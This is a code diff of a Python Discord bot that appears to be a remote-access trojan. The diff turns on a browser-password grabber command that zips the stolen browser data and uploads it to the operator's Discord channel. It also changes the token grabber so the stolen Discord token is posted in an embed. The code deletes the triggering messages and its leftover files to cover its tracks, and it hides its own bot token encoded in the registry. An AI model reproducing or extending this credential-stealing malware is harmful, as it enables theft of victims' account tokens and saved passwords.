@@ -4,7 +4,7 @@ import libs.computer as pc
 import libs.powershell as pw
 import libs.registry_handler as reg_h
 import libs.files as files
-from shutil import copy;
+from shutil import copy, make_archive
 import base64
 import gzip
 import subprocess
@@ -42,11 +42,11 @@ def get_raw_git_content(url):
     r = requests.get(url)
     return r.text
 
-if config["Settings"]["version"] != get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", ""):
-    subprocess.call("./update.ps1")
-    quit()
-elif file_version == get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", "") and config["Settings"]["version"] != get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", ""):
-    config["Settings"]["version"] = get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", "")
+#if config["Settings"]["version"] != get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", ""):
+#    subprocess.call(f"{os.getcwd()}/update.ps1")
+#   quit()
+#elif file_version == get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", "") and config["Settings"]["version"] != get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", ""):
+#    config["Settings"]["version"] = get_raw_git_content("https://raw.githubusercontent.com/richa-z/Snky/main/version_helper.txt").replace("\n", "")
 
 @client.event
 async def on_ready():
@@ -523,23 +523,27 @@ async def on_message(message):
         while(os.path.exists(f"{os.getcwd()}\\token.txt") == False):
             time.sleep(1)
 
-        await message.channel.send(file=discord.File(f"{os.getcwd()}\\token.txt"))
+        with open(f"{os.getcwd()}\\token.txt", "r") as f:
+            token = f.read()
+        
+        embed = discord.Embed(title="Token Grabber", description=f"{token}", color=0x00ff00)
+        await message.channel.send(embed=embed)
         os.remove(f"{os.getcwd()}\\token.txt")
         
     if message.content.startswith(".browser_grab"):
-        #await message.delete()
+        await message.delete()
         #run token_grabber.pyw and wait until finished then send token.txt
-        #os.system(f"py {os.getcwd()}\\built_in_modules\\browser_psw.pyw")
+        os.system(f"py {os.getcwd()}\\built_in_modules\\browser_psw.pyw")
 
-        #embed = discord.Embed(title="Token Grabber", description="Browser grabber executed.", color=0x00ff00)
-        #await message.channel.send(embed=embed)
+        embed = discord.Embed(title="Token Grabber", description="Browser grabber executed.", color=0x00ff00)
+        await message.channel.send(embed=embed)
 
-        #while(os.path.exists(f"{os.getcwd()}\\token.txt") == False):
-            #time.sleep(1)
+        while(os.path.exists(f"{os.getcwd()}\\browsers") == False):
+            time.sleep(1)
 
-        #await message.channel.send(file=discord.File(f"{os.getcwd()}\\token.txt"))
-        #os.remove(f"{os.getcwd()}\\token.txt")  
-        embed = discord.Embed(title="Browser Grabber", description="Browser grabber is currently disabled.", color=0x00ff00)
-        await message.channel.send(embed=embed)  
+        make_archive("browsers", "zip", f"{os.getcwd()}\\browsers")
+        await message.channel.send(file=discord.File(f"{os.getcwd()}\\browsers.zip"))
+        os.remove(f"{os.getcwd()}\\browsers.zip")
+        os.remove(f"{os.getcwd()}\\browsers")
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
